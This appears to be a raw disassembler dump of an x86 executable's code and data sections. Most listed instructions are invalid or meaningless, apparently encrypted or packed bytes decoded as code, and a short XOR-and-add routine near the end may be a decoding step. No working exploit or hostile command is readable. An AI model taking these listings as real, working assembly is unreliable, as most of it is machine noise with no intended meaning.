  411bc5:	ret    
  411bc6:	pop    es
  411bc7:	inc    esp
  411bc8:	push   edi
  411bc9:	(bad)  
  411bca:	fsubr  QWORD PTR [edx+ebp*1-0x74212c34]
  411bd1:	or     dh,BYTE PTR [edx+0x77]
  411bd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bd5:	retf   
  411bd6:	or     dh,dh
  411bd8:	(bad)
  411bdd:	and    BYTE PTR [edi-0x64],ch
  411be0:	call   0x6effe6f3
  411be5:	mov    ch,0x67
  411be7:	test   BYTE PTR [edi+0x34],dh
  411bea:	idiv   BYTE PTR [esi+0x593abcdc]
  411bf0:	adc    eax,0x5b7a2f57
  411bf5:	gs int 0xc3
  411bf8:	pop    es
  411bf9:	or     edx,DWORD PTR [ebp-0x2e]
  411bfc:	sahf   
  411bfd:	pusha  
  411bfe:	jl     0x411bd4
  411c00:	sbb    edx,DWORD PTR [eax-0x16732bed]
  411c06:	mov    esi,0xbf9d70a3
  411c0b:	jecxz  0x411bac
  411c0d:	(bad)  
  411c0e:	jbe    0x411c1a
  411c10:	jmp    0x411c15
  411c12:	adc    bl,cl
  411c14:	xor    DWORD PTR [esi-0x67],edx
  411c17:	fcomp  QWORD PTR [eax-0x80]
  411c1a:	push   cs
  411c1b:	jno    0x411ba7
  411c1d:	retf   0x5c97
  411c20:	je     0x411bfc
  411c22:	mov    eax,ds:0x7fd7d082
  411c27:	inc    ebx
  411c28:	sti    
  411c29:	inc    ecx
  411c2a:	pop    es
  411c2b:	cld    
  411c2c:	sbb    eax,0x22ec698b
  411c31:	loopne 0x411bcf
  411c33:	lock lods al,BYTE PTR ds:[esi]
  411c35:	(bad)  
  411c36:	(bad)  
  411c37:	jo     0x411c82
  411c39:	inc    ecx
  411c3a:	sti    
  411c3b:	adc    dh,BYTE PTR [ebx]
  411c3d:	ret    0x8b56
  411c40:	jne    0x411c4a
  411c42:	mov    ecx,0x32729b
  411c47:	add    eax,ecx
  411c49:	jmp    0x411e84
  411c4e:	mov    WORD PTR [eax-0x1a6d186e],cs
  411c54:	imul   esi,DWORD PTR [ecx-0x48],0x30dad6c4
  411c5b:	sbb    BYTE PTR [ebx],dh
  411c5d:	loopne 0x411c26
  411c5f:	dec    ebx
  411c60:	jle    0x411ce0
  411c62:	adc    BYTE PTR [esi+edi*2+0x7e],bh
  411c66:	lods   al,BYTE PTR ds:[esi]
  411c67:	loope  0x411c2c
  411c69:	fidivr WORD PTR [edx+0x11060122]
  411c6f:	xchg   esi,eax
  411c70:	ror    DWORD PTR [ebx],0x56
  411c73:	mov    esp,0x9aef50b
  411c78:	cmp    eax,0xe51e03a
  411c7d:	in     al,dx
  411c7e:	inc    esi
  411c7f:	pusha  
  411c80:	jae    0x411cdf
  411c82:	xchg   ebx,eax
  411c83:	jmp    0x8f226ffc
  411c88:	test   al,0x86
  411c8a:	jl     0x411c15
  411c8c:	xchg   edi,eax
  411c8d:	shl    BYTE PTR [eax],1
  411c8f:	xor    DWORD PTR [ebp-0x7f],ecx
  411c92:	data16 loop 0x411d06
  411c95:	inc    esi
  411c96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c97:	and    DWORD PTR [edi],ecx
  411c99:	(bad)  
  411c9a:	call   0x20f6:0xdb8f1ef0
  411ca1:	cmp    BYTE PTR [eax+0x4d],cl
  411ca4:	daa    
  411ca5:	cmp    al,0x57
  411ca7:	imul   edi,edx,0x7a
  411caa:	cmp    ah,bl
  411cac:	les    edi,FWORD PTR [ecx]
  411cae:	enter  0x71c2,0x6f
  411cb2:	icebp  
  411cb3:	neg    ah
  411cb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cb6:	stos   BYTE PTR es:[edi],al
  411cb7:	stos   BYTE PTR es:[edi],al
  411cb8:	pop    edi
  411cb9:	mov    al,BYTE PTR [edx+0x342d7532]
  411cbf:	push   ecx
  411cc0:	es pop esp
  411cc2:	imul   edi,eax,0x272edebf
  411cc8:	mov    cl,0x1d
  411cca:	in     al,dx
  411ccb:	sub    edx,ebx
  411ccd:	xchg   edx,eax
  411cce:	bound  esp,QWORD PTR [ebx-0x1dd0d6a1]
  411cd4:	(bad)  
  411cd5:	or     dl,BYTE PTR [esi+0x2d]
  411cd8:	jp     0x411ce2
  411cda:	dec    ecx
  411cdb:	fdivr  st(7),st
  411cdd:	daa    
  411cde:	dec    DWORD PTR [ecx]
  411ce0:	mov    cl,0x2b
  411ce2:	stos   BYTE PTR es:[edi],al
  411ce3:	cmp    edi,DWORD PTR [ebx+0x1e7c8f3a]
  411ce9:	gs mov edx,0x2149297
  411cef:	jle    0x411d63
  411cf1:	and    eax,0x505b39a7
  411cf6:	(bad)  
  411cf8:	or     al,0x8d
  411cfa:	aas    
  411cfb:	adc    eax,0xa4255ae4
  411d00:	retf   0x637b
  411d03:	and    bh,BYTE PTR [eax+0x10299335]
  411d09:	xchg   edx,eax
  411d0a:	popa   
  411d0b:	push   ds
  411d0c:	adc    eax,0xf26c73dd
  411d11:	fst    QWORD PTR [ecx]
  411d13:	mov    ?,ebp
  411d15:	cmp    eax,0x14015bc3
  411d1a:	out    dx,eax
  411d1b:	mov    al,ds:0x89105171
  411d20:	mov    dl,0x45
  411d22:	call   0xd22d85f0
  411d27:	stc    
  411d28:	pop    ebp
  411d29:	and    ebx,DWORD PTR [edi+esi*1]
  411d2c:	cld    
  411d2d:	iret   
  411d2e:	jb     0x411cf9
  411d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d31:	pop    eax
  411d32:	sbb    BYTE PTR [edx],dl
  411d34:	inc    eax
  411d35:	(bad)  
  411d36:	fstp   TBYTE PTR [edx]
  411d38:	repz cld 
  411d3a:	xor    esi,eax
  411d3c:	push   cs
  411d3d:	fcomp  DWORD PTR [ebx-0x32d77434]
  411d43:	mov    fs,edx
  411d45:	sub    al,0x5b
  411d47:	xchg   esi,eax
  411d48:	enter  0x70c1,0xce
  411d4c:	inc    ebx
  411d4d:	aas    
  411d4e:	mov    eax,ds:0xdac1d1f6
  411d53:	pop    edi
  411d54:	push   edi
  411d55:	pop    es
  411d56:	jne    0x411dc8
  411d58:	cmp    BYTE PTR [ebp+0x45],0xa8
  411d5c:	out    0xe2,eax
  411d5e:	xchg   BYTE PTR [esp+edi*4+0x5a],bl
  411d62:	dec    edi
  411d63:	mov    ecx,0xfb0b63ac
  411d68:	jl     0x411d91
  411d6a:	mov    ah,0x3d
  411d6c:	out    0x9b,eax
  411d6e:	icebp  
  411d6f:	add    dl,bh
  411d71:	(bad)  
  411d72:	(bad)  
  411d73:	cmp    eax,0x39f94244
  411d78:	ins    BYTE PTR es:[edi],dx
  411d79:	pop    ebx
  411d7a:	pop    esi
  411d7b:	call   0x8bf:0x59e6e9fc
  411d82:	dec    eax
  411d83:	adc    ecx,DWORD PTR [ebx+0x57f2ff04]
  411d89:	push   0xffffffc5
  411d8b:	neg    DWORD PTR [ecx-0x53]
  411d8e:	xchg   ebp,eax
  411d8f:	dec    esp
  411d90:	out    dx,al
  411d91:	(bad)  
  411d92:	push   edi
  411d93:	or     DWORD PTR [ecx],0xe
  411d96:	out    0x7b,al
  411d98:	push   cs
  411d99:	adc    esi,DWORD PTR [ecx]
  411d9b:	xor    cl,BYTE PTR [edx]
  411d9d:	in     eax,0x56
  411d9f:	ss jb  0x411da0
  411da2:	dec    eax
  411da3:	es inc ebp
  411da5:	inc    bp
  411da7:	fldenv [edi+0x7e]
  411daa:	imul   ebx,DWORD PTR [esi+edx*8],0xe635d82a
  411db1:	mov    edx,0xc59faa51
  411db6:	data16 xor al,0xea
  411db9:	fidiv  WORD PTR [ebx]
  411dbb:	test   DWORD PTR [esi-0x7bd46e5],ebx
  411dc1:	or     esp,edi
  411dc3:	jmp    0xd3401e89
  411dc8:	adc    BYTE PTR [edi+0x2f],ah
  411dcb:	mov    dh,0x24
  411dcd:	push   edi
  411dce:	mov    bh,0x2
  411dd0:	(bad)  
  411dd1:	ins    DWORD PTR es:[edi],dx
  411dd2:	test   DWORD PTR [edx-0x122cb7c6],edi
  411dd8:	pop    ebx
  411dd9:	retf   
  411dda:	cmp    DWORD PTR [ecx+0x27],edx
  411ddd:	hlt    
  411dde:	retf   
  411ddf:	xchg   ebp,eax
  411de0:	stos   DWORD PTR es:[edi],eax
  411de1:	xchg   esp,eax
  411de2:	push   es
  411de3:	adc    eax,0x9be963f5
  411de8:	jns    0x411e07
  411dea:	inc    ebp
  411deb:	(bad)  
  411dec:	sbb    BYTE PTR ds:0x5487102f,0x6e
  411df3:	rcr    DWORD PTR [eax],1
  411df5:	jle    0x411d90
  411df7:	dec    edx
  411df8:	pop    esi
  411df9:	xor    bh,BYTE PTR [edi]
  411dfb:	cmp    esp,ecx
  411dfd:	sub    al,0xe3
  411dff:	mov    ah,0x70
  411e01:	mov    al,0x43
  411e03:	cdq    
  411e04:	int3   
  411e05:	outs   dx,DWORD PTR ds:[esi]
  411e06:	inc    edx
  411e07:	cmp    bh,BYTE PTR es:[ecx]
  411e0a:	xchg   BYTE PTR [ecx-0x2b62d530],bl
  411e10:	cwde   
  411e11:	pushf  
  411e12:	cmp    BYTE PTR [edx+0x7d3d6982],ah
  411e18:	ins    BYTE PTR es:[edi],dx
  411e19:	xor    BYTE PTR [eax],al
  411e1b:	push   ss
  411e1c:	push   0xffffff8f
  411e1e:	ja     0x411e04
  411e20:	xor    DWORD PTR [ecx],ebp
  411e22:	test   eax,0x12f01698
  411e27:	push   esp
  411e28:	sub    DWORD PTR [ebp-0x6],eax
  411e2b:	dec    edx
  411e2c:	dec    edx
  411e2d:	sub    eax,0x89323a2
  411e32:	sub    ebp,DWORD PTR [ebp-0x27]
  411e35:	pop    ds
  411e36:	cmp    dh,0x18
  411e39:	mov    BYTE PTR [ebp-0x21],ah
  411e3c:	out    0x19,eax
  411e3e:	pop    esp
  411e3f:	push   edx
  411e40:	fnsave [eax+0x1d]
  411e43:	inc    edi
  411e44:	ins    DWORD PTR es:[edi],dx
  411e45:	iret   
  411e46:	jmp    0x15de:0x55f22f14
  411e4d:	call   0x138e:0xa04e6ddd
  411e54:	mov    edx,es
  411e56:	xor    BYTE PTR [eax],0x48
  411e59:	push   es
  411e5a:	add    eax,0xb08e6199
  411e5f:	iret   
  411e60:	pop    edx
  411e61:	dec    ecx
  411e62:	or     al,0x32
  411e64:	push   ds
  411e65:	lea    esi,[ecx-0x73]
  411e68:	movq   mm0,mm1
  411e6b:	jbe    0x411eda
  411e6d:	loope  0x411e96
  411e6f:	mov    dl,0xcc
  411e72:	push   cs
  411e73:	fiadd  DWORD PTR [ebp+0x755de2f2]
  411e79:	mov    ds:0xe66a627c,eax
  411e7e:	fistp  WORD PTR [ebx]
  411e80:	push   eax
  411e81:	sub    DWORD PTR [edx],edx
  411e83:	enter  0x4639,0x54
  411e87:	pop    esi
  411e88:	je     0x411e96
  411e8e:	mov    eax,DWORD PTR [ebp+0x8]
  411e91:	jmp    0x411eaf
  411e96:	mov    eax,DWORD PTR [ebp-0x4]
  411e99:	xor    eax,edx
  411e9b:	add    eax,ecx
  411e9d:	jmp    0x411eaf
  411ea2:	mov    eax,DWORD PTR [ebp-0x4]
  411ea5:	xor    eax,0x7510854
  411eaa:	add    eax,0x32729b
  411eaf:	leave  
  411eb0:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    BYTE PTR [ecx],0x1
  412003:	add    BYTE PTR [edx-0x5dfffed7],dl
  412009:	sub    DWORD PTR [ecx],eax
  41200b:	add    BYTE PTR [eax-0x41fffed7],dh
  412011:	sub    DWORD PTR [ecx],eax
  412013:	add    ah,dl
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    ah,ah
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    dh,dh
  41201d:	sub    DWORD PTR [ecx],eax
  41201f:	add    BYTE PTR [edx],al
  412021:	sub    al,BYTE PTR [ecx]
  412023:	add    BYTE PTR [edx+ebp*1],dl
  412026:	add    DWORD PTR [eax],eax
  412028:	and    BYTE PTR [edx],ch
  41202a:	add    DWORD PTR [eax],eax
  41202c:	sub    al,BYTE PTR cs:[ecx]
  41202f:	add    BYTE PTR [esi+0x2a],al
  412032:	add    DWORD PTR [eax],eax
  412034:	pop    eax
  412035:	sub    al,BYTE PTR [ecx]
  412037:	add    BYTE PTR [esi+0x2a],ah
  41203a:	add    DWORD PTR [eax],eax
  41203c:	js     0x412068
  41203e:	add    DWORD PTR [eax],eax
  412040:	mov    gs,WORD PTR [edx]
  412042:	add    DWORD PTR [eax],eax
  412044:	sahf   
  412045:	sub    al,BYTE PTR [ecx]
  412047:	add    BYTE PTR [edx-0x35fffed6],dh
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    dh,bl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    dl,ch
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    ah,bh
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx],dl
  41205d:	sub    eax,DWORD PTR [ecx]
  41205f:	add    BYTE PTR [esi],bl
  412061:	sub    eax,DWORD PTR [ecx]
  412063:	add    BYTE PTR [ebx+ebp*1],ch
  412066:	add    DWORD PTR [eax],eax
  412068:	inc    eax
  412069:	sub    eax,DWORD PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2b],cl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    eax,DWORD PTR fs:[ecx]
  412073:	add    BYTE PTR [edx+0x2b],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	test   BYTE PTR [ebx],ch
  41207a:	add    DWORD PTR [eax],eax
  41207c:	mov    gs,WORD PTR [ebx]
  41207e:	add    DWORD PTR [eax],eax
  412080:	sahf   
  412081:	sub    eax,DWORD PTR [ecx]
  412083:	add    BYTE PTR [eax-0x3bfffed5],bh
  412089:	sub    eax,DWORD PTR [ecx]
  41208b:	add    al,dl
  41208d:	sub    eax,DWORD PTR [ecx]
  41208f:	add    ah,ch
  412091:	sub    eax,DWORD PTR [ecx]
  412093:	add    ah,bh
  412095:	sub    eax,DWORD PTR [ecx]
  412097:	add    BYTE PTR [edx],cl
  412099:	sub    al,0x1
  41209b:	add    BYTE PTR [eax],bl
  41209d:	sub    al,0x1
  41209f:	add    BYTE PTR [esp+ebp*1],ah
  4120a2:	add    DWORD PTR [eax],eax
  4120a4:	cmp    BYTE PTR [ecx+eax*1],ch
  4120a7:	add    BYTE PTR [esi+0x2c],cl
  4120aa:	add    DWORD PTR [eax],eax
  4120ac:	pop    edx
  4120ad:	sub    al,0x1
  4120af:	add    BYTE PTR [edx+0x2c],ch
  4120b2:	add    DWORD PTR [eax],eax
  4120b4:	jl     0x4120e2
  4120b6:	add    DWORD PTR [eax],eax
  4120b8:	mov    gs,WORD PTR [ecx+eax*1]
  4120bb:	add    BYTE PTR [eax-0x47fffed4],ah
  4120c1:	sub    al,0x1
  4120c3:	add    al,cl
  4120c5:	sub    al,0x1
  4120c7:	add    dh,dl
  4120c9:	sub    al,0x1
  4120cb:	add    ah,ah
  4120cd:	sub    al,0x1
  4120cf:	add    dh,dh
  4120d1:	sub    al,0x1
  4120d3:	add    BYTE PTR [esi],al
  4120d5:	sub    eax,0x2d140001
  4120da:	add    DWORD PTR [eax],eax
  4120dc:	es sub eax,0x2d3c0001
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	dec    edx
  4120e5:	sub    eax,0x2d5a0001
  4120ea:	add    DWORD PTR [eax],eax
  4120ec:	push   0x2d
  4120ee:	add    DWORD PTR [eax],eax
  4120f0:	je     0x41211f
  4120f2:	add    DWORD PTR [eax],eax
  4120f4:	test   BYTE PTR ds:0x2d900001,ch
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	sahf   
  4120fd:	sub    eax,0x2daa0001
  412102:	add    DWORD PTR [eax],eax
  412104:	mov    eax,0xd000012d
  412109:	sub    eax,0x2dde0001
  41210e:	add    DWORD PTR [eax],eax
  412110:	out    dx,al
  412111:	sub    eax,0x2dfe0001
  412116:	add    DWORD PTR [eax],eax
  412118:	or     al,0x2e
  41211a:	add    DWORD PTR [eax],eax
  41211c:	push   ds
  41211d:	add    DWORD PTR cs:[eax],eax
  412120:	xor    ch,BYTE PTR [esi]
  412122:	add    DWORD PTR [eax],eax
  412124:	dec    esi
  412125:	add    DWORD PTR cs:[eax],eax
  412128:	pop    esi
  412129:	add    DWORD PTR cs:[eax],eax
  41212c:	je     0x41215c
  41212e:	add    DWORD PTR [eax],eax
  412130:	xchg   BYTE PTR [esi],ch
  412132:	add    DWORD PTR [eax],eax
  412134:	call   0x12e:0xac00012e
  41213b:	add    BYTE PTR [esi-0x33fffed2],bh
  412141:	add    DWORD PTR cs:[eax],eax
  412144:	fisubr DWORD PTR [esi]
  412146:	add    DWORD PTR [eax],eax
  412148:	out    dx,al
  412149:	add    DWORD PTR cs:[eax],eax
  41214c:	cli    
  41214d:	add    DWORD PTR cs:[eax],eax
  412150:	push   cs
  412151:	das    
  412152:	add    DWORD PTR [eax],eax
  412154:	push   ds
  412155:	das    
  412156:	add    DWORD PTR [eax],eax
  412158:	cs das 
  41215a:	add    DWORD PTR [eax],eax
  41215c:	inc    eax
  41215d:	das    
  41215e:	add    DWORD PTR [eax],eax
  412160:	pop    eax
  412161:	das    
  412162:	add    DWORD PTR [eax],eax
  412164:	outs   dx,BYTE PTR ds:[esi]
  412165:	das    
  412166:	add    DWORD PTR [eax],eax
  412168:	jle    0x412199
  41216a:	add    DWORD PTR [eax],eax
  41216c:	call   0x12f:0xae00012f
  412173:	add    BYTE PTR [edx-0x39fffed1],bh
  412179:	das    
  41217a:	add    DWORD PTR [eax],eax
  41217c:	aam    0x2f
  41217e:	add    DWORD PTR [eax],eax
  412180:	in     al,0x2f
  412182:	add    DWORD PTR [eax],eax
  412184:	cli    
  412185:	das    
  412186:	add    DWORD PTR [eax],eax
  412188:	or     al,0x30
  41218a:	add    DWORD PTR [eax],eax
  41218c:	push   ss
  41218d:	xor    BYTE PTR [ecx],al
  41218f:	add    BYTE PTR [esi],ch
  412191:	xor    BYTE PTR [ecx],al
  412193:	add    BYTE PTR [edx],bh
  412195:	xor    BYTE PTR [ecx],al
  412197:	add    BYTE PTR [eax+esi*1+0x1],cl
  41219b:	add    BYTE PTR [eax+0x30],bl
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	jb     0x4121d2
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	jle    0x4121d6
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	mov    WORD PTR [eax],?
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	mov    ds:0xb8000130,al
  4121b1:	xor    BYTE PTR [ecx],al
  4121b3:	add    BYTE PTR [eax],al
  4121b5:	add    BYTE PTR [eax],al
  4121b7:	add    ah,dl
  4121b9:	xor    BYTE PTR [ecx],al
  4121bb:	add    al,ch
  4121bd:	xor    BYTE PTR [ecx],al
  4121bf:	add    BYTE PTR [eax],al
  4121c1:	xor    DWORD PTR [ecx],eax
  4121c3:	add    BYTE PTR [esi],dl
  4121c5:	xor    DWORD PTR [ecx],eax
  4121c7:	add    BYTE PTR [esi],ah
  4121c9:	xor    DWORD PTR [ecx],eax
  4121cb:	add    BYTE PTR [ecx+esi*1],dh
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	dec    esp
  4121d1:	xor    DWORD PTR [ecx],eax
  4121d3:	add    BYTE PTR [edx+0x31],bl
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	xor    WORD PTR [ecx],ax
  4121db:	add    BYTE PTR [eax+0x31],bh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xchg   esp,eax
  4121e1:	xor    DWORD PTR [ecx],eax
  4121e3:	add    BYTE PTR [edx-0x49fffecf],ah
  4121e9:	xor    DWORD PTR [ecx],eax
  4121eb:	add    dh,al
  4121ed:	xor    DWORD PTR [ecx],eax
  4121ef:	add    dl,dl
  4121f1:	xor    DWORD PTR [ecx],eax
  4121f3:	add    ah,ah
  4121f5:	xor    DWORD PTR [ecx],eax
  4121f7:	add    ah,ch
  4121f9:	xor    DWORD PTR [ecx],eax
  4121fb:	add    ah,bh
  4121fd:	xor    DWORD PTR [ecx],eax
  4121ff:	add    BYTE PTR [esi],cl
  412201:	xor    al,BYTE PTR [ecx]
  412203:	add    BYTE PTR [edx+esi*1],bl
  412206:	add    DWORD PTR [eax],eax
  412208:	xor    al,BYTE PTR cs:[ecx]
  41220b:	add    BYTE PTR [eax+0x32],al
  41220e:	add    DWORD PTR [eax],eax
  412210:	push   esi
  412211:	xor    al,BYTE PTR [ecx]
  412213:	add    BYTE PTR [esi+0x32],ah
  412216:	add    DWORD PTR [eax],eax
  412218:	js     0x41224c
  41221a:	add    DWORD PTR [eax],eax
  41221c:	mov    dh,BYTE PTR [edx]
  41221e:	add    DWORD PTR [eax],eax
  412220:	call   0x132:0xb0000132
  412227:	add    al,al
  412229:	xor    al,BYTE PTR [ecx]
  41222b:	add    ah,cl
  41222d:	xor    al,BYTE PTR [ecx]
  41222f:	add    dl,ah
  412231:	xor    al,BYTE PTR [ecx]
  412233:	add    ah,dh
  412235:	xor    al,BYTE PTR [ecx]
  412237:	add    BYTE PTR [esi],al
  412239:	xor    eax,DWORD PTR [ecx]
  41223b:	add    BYTE PTR [esi],dl
  41223d:	xor    eax,DWORD PTR [ecx]
  41223f:	add    BYTE PTR [ebx+esi*1],ch
  412242:	add    DWORD PTR [eax],eax
  412244:	cmp    dh,BYTE PTR [ebx]
  412246:	add    DWORD PTR [eax],eax
  412248:	push   eax
  412249:	xor    eax,DWORD PTR [ecx]
  41224b:	add    BYTE PTR [ebx+esi*1+0x1],ah
  41224f:	add    BYTE PTR [edx+0x33],bh
  412252:	add    DWORD PTR [eax],eax
  412254:	cwde   
  412255:	xor    eax,DWORD PTR [ecx]
  412257:	add    BYTE PTR [eax-0x43fffecd],dh
  41225d:	xor    eax,DWORD PTR [ecx]
  41225f:	add    dh,cl
  412261:	xor    eax,DWORD PTR [ecx]
  412263:	add    dl,bl
  412265:	xor    eax,DWORD PTR [ecx]
  412267:	add    dh,ch
  412269:	xor    eax,DWORD PTR [ecx]
  41226b:	add    BYTE PTR [esi],al
  41226d:	xor    al,0x1
  41226f:	add    BYTE PTR [edx],dl
  412271:	xor    al,0x1
  412273:	add    BYTE PTR [eax],ah
  412275:	xor    al,0x1
  412277:	add    BYTE PTR [edx],dh
  412279:	xor    al,0x1
  41227b:	add    BYTE PTR [edx+0x34],al
  41227e:	add    DWORD PTR [eax],eax
  412280:	dec    esp
  412281:	xor    al,0x1
  412283:	add    BYTE PTR [eax],al
  412285:	add    BYTE PTR [eax],al
  412287:	add    BYTE PTR [esi+0x34],ah
  41228a:	add    DWORD PTR [eax],eax
  41228c:	je     0x4122c2
  41228e:	add    DWORD PTR [eax],eax
  412290:	xor    BYTE PTR [ecx+eax*1],0x0
  412294:	xchg   esp,eax
  412295:	xor    al,0x1
  412297:	add    BYTE PTR [eax],al
  412299:	add    BYTE PTR [eax],al
  41229b:	add    BYTE PTR [esi-0x43fffecc],ch
  4122a1:	xor    al,0x1
  4122a3:	add    dh,cl
  4122a5:	xor    al,0x1
  4122a7:	add    ah,bl
  4122a9:	xor    al,0x1
  4122ab:	add    ah,ah
  4122ad:	xor    al,0x1
  4122af:	add    ah,dh
  4122b1:	xor    al,0x1
  4122b3:	add    BYTE PTR [eax],al
  4122b5:	xor    eax,0x350e0001
  4122ba:	add    DWORD PTR [eax],eax
  4122bc:	push   ss
  4122bd:	xor    eax,0x35220001
  4122c2:	add    DWORD PTR [eax],eax
  4122c4:	sub    al,0x35
  4122c6:	add    DWORD PTR [eax],eax
  4122c8:	ss xor eax,0x353e0001
  4122ce:	add    DWORD PTR [eax],eax
  4122d0:	dec    eax
  4122d1:	xor    eax,0x35520001
  4122d6:	add    DWORD PTR [eax],eax
  4122d8:	pop    esp
  4122d9:	xor    eax,0x35680001
  4122de:	add    DWORD PTR [eax],eax
  4122e0:	je     0x412317
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	jle    0x41231b
  4122e6:	add    DWORD PTR [eax],eax
  4122e8:	mov    BYTE PTR ds:0x35920001,dh
  4122ee:	add    DWORD PTR [eax],eax
  4122f0:	mov    al,ds:0xa8000135
  4122f5:	xor    eax,0x35b40001
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	mov    esi,0xc8000135
  412301:	xor    eax,0x35d20001
  412306:	add    DWORD PTR [eax],eax
  412308:	fidiv  WORD PTR ds:0x35ec0001
  41230e:	add    DWORD PTR [eax],eax
  412310:	clc    
  412311:	xor    eax,0x36000001
  412316:	add    DWORD PTR [eax],eax
  412318:	or     al,0x36
  41231a:	add    DWORD PTR [eax],eax
  41231c:	push   ss
  41231d:	add    DWORD PTR ss:[eax],eax
  412320:	and    BYTE PTR [esi],dh
  412322:	add    DWORD PTR [eax],eax
  412324:	sub    BYTE PTR [esi],dh
  412326:	add    DWORD PTR [eax],eax
  412328:	xor    dh,BYTE PTR [esi]
  41232a:	add    DWORD PTR [eax],eax
  41232c:	cmp    al,0x36
  41232e:	add    DWORD PTR [eax],eax
  412330:	inc    esi
  412331:	add    DWORD PTR ss:[eax],eax
  412334:	push   eax
  412335:	add    DWORD PTR ss:[eax],eax
  412338:	pop    edx
  412339:	add    DWORD PTR ss:[eax],eax
  41233c:	fs add DWORD PTR ss:[eax],eax
  412340:	outs   dx,BYTE PTR ds:[esi]
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	xor    BYTE PTR [esi],0x1
  412347:	add    BYTE PTR [edx+0x136],dl
  41234d:	add    BYTE PTR [eax],al
  41234f:	add    BYTE PTR [eax-0x3ffffeca],ch
  412355:	add    DWORD PTR ss:[eax],eax
  412358:	fdiv   DWORD PTR [esi]
  41235a:	add    DWORD PTR [eax],eax
  41235c:	hlt    
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	or     al,0x37
  412362:	add    DWORD PTR [eax],eax
  412364:	and    al,0x37
  412366:	add    DWORD PTR [eax],eax
  412368:	add    BYTE PTR [eax],al
  41236a:	add    BYTE PTR [eax],al
  41236c:	inc    esi
  41236d:	aaa    
  41236e:	add    DWORD PTR [eax],eax
  412370:	pop    esp
  412371:	aaa    
  412372:	add    DWORD PTR [eax],eax
  412374:	jo     0x4123ad
  412376:	add    DWORD PTR [eax],eax
  412378:	jle    0x4123b1
  41237a:	add    DWORD PTR [eax],eax
  41237c:	mov    dh,BYTE PTR [edi]
  41237e:	add    DWORD PTR [eax],eax
  412380:	cwde   
  412381:	aaa    
  412382:	add    DWORD PTR [eax],eax
  412384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412385:	aaa    
  412386:	add    DWORD PTR [eax],eax
  412388:	mov    ah,0x37
  41238a:	add    DWORD PTR [eax],eax
  41238c:	les    esi,FWORD PTR [edi]
  41238e:	add    DWORD PTR [eax],eax
  412390:	into   
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	fidiv  DWORD PTR [edi]
  412396:	add    DWORD PTR [eax],eax
  412398:	repnz aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	push   es
  41239d:	cmp    BYTE PTR [ecx],al
  41239f:	add    BYTE PTR [eax],bl
  4123a1:	cmp    BYTE PTR [ecx],al
  4123a3:	add    BYTE PTR [eax],ch
  4123a5:	cmp    BYTE PTR [ecx],al
  4123a7:	add    BYTE PTR [eax+edi*1],dh
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	dec    edx
  4123ad:	cmp    BYTE PTR [ecx],al
  4123af:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123b3:	add    BYTE PTR [eax+edi*1+0x1],ch
  4123b7:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	stos   BYTE PTR es:[edi],al
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [esi-0x35fffec8],dh
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    dh,bl
  4123cd:	cmp    BYTE PTR [ecx],al
  4123cf:	add    dh,ch
  4123d1:	cmp    BYTE PTR [ecx],al
  4123d3:	add    dh,bh
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [esi],cl
  4123d9:	cmp    DWORD PTR [ecx],eax
  4123db:	add    BYTE PTR [ecx+edi*1],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	sub    bh,BYTE PTR [ecx]
  4123e2:	add    DWORD PTR [eax],eax
  4123e4:	cmp    BYTE PTR [ecx],bh
  4123e6:	add    DWORD PTR [eax],eax
  4123e8:	inc    esp
  4123e9:	cmp    DWORD PTR [ecx],eax
  4123eb:	add    BYTE PTR [eax+0x39],bl
  4123ee:	add    DWORD PTR [eax],eax
  4123f0:	cmp    DWORD PTR fs:[ecx],eax
  4123f3:	add    BYTE PTR [ecx+edi*1+0x1],dh
  4123f7:	add    BYTE PTR [esi+0x39],bh
  4123fa:	add    DWORD PTR [eax],eax
  4123fc:	xchg   esp,eax
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [esi-0x45fffec7],bl
  412405:	cmp    DWORD PTR [ecx],eax
  412407:	add    al,dl
  412409:	cmp    DWORD PTR [ecx],eax
  41240b:	add    al,ah
  41240d:	cmp    DWORD PTR [ecx],eax
  41240f:	add    al,dh
  412411:	cmp    DWORD PTR [ecx],eax
  412413:	add    ah,bh
  412415:	cmp    DWORD PTR [ecx],eax
  412417:	add    BYTE PTR [eax],cl
  412419:	cmp    al,BYTE PTR [ecx]
  41241b:	add    BYTE PTR [eax],al
  41241d:	add    BYTE PTR [eax],al
